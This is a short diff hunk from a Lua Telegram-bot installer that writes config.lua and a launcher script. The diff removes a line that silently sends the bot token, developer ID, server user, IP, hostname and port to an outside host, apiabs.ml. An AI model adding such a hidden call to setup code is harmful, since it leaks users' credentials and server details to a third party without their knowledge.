@@ -77,7 +77,6 @@ Milanuu = DevRio:get(Server.."TokenMilanuu"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdMilanuu")},
 }
 Create(Config, "./config.lua") 
-https.request("https://apiabs.ml/Api/Milanuu/index.php?Get=Milanuu&DevId="..DevRio:get(Server.."IdMilanuu").."&TokenBot="..DevRio:get(Server.."TokenMilanuu").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("Milanuu.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
